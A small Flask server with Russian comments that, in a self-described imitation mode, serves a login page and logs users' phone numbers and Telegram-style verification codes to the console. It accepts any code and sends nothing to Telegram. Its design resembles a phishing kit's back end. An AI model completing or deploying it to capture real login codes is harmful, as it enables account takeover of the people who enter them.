from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import uuid
import os

app = Flask(__name__, static_folder='.')
CORS(app)

# Временное хранилище для номеров (в памяти)
pending_requests = {}

# 1. Отдаем твой HTML файл при заходе на сайт
@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

# 2. Разрешаем браузеру скачивать картинки (logo.png и т.д.)
@app.route('/<path:filename>')
def serve_static(filename):
    return send_from_directory('.', filename)

# 3. ИМИТАЦИЯ ОТПРАВКИ КОДА (БЕЗ TELEGRAM)
@app.route('/api/send_code', methods=['POST'])
def api_send_code():
    data = request.json
    phone_number = data.get('phone')
    
    print(f"\n[+] Пользователь ввел номер: {phone_number}")
    print("[+] ИМИТАЦИЯ: Код не отправляется в Telegram. Ждем любой ввод.")
    
    request_id = str(uuid.uuid4())
    pending_requests[request_id] = phone_number
    
    return jsonify({"success": True, "request_id": request_id})

# 4. ПРОВЕРКА ЛЮБОГО КОДА
@app.route('/api/verify_code', methods=['POST'])
def api_verify_code():
    data = request.json
    request_id = data.get('request_id')
    user_code = data.get('code')
    
    print(f"\n[+] Пользователь ввел код: {user_code}")
    
    if request_id in pending_requests:
        phone = pending_requests[request_id]
        print(f"[+] УСПЕХ! Номер {phone} 'авторизован' с кодом {user_code}.")
        del pending_requests[request_id]
        return jsonify({"success": True})
    else:
        print("[-] Ошибка: Сессия не найдена.")
        return jsonify({"success": False, "error": "Сессия истекла"})

if __name__ == '__main__':
    print("=== СЕРВЕР ЗАПУЩЕН (ИМИТАЦИЯ) ===")
    print("Открой в браузере: http://127.0.0.1:5000")
    print("Коды в Telegram НЕ ОТПРАВЛЯЮТСЯ.\n")
    app.run(debug=True, port=5000)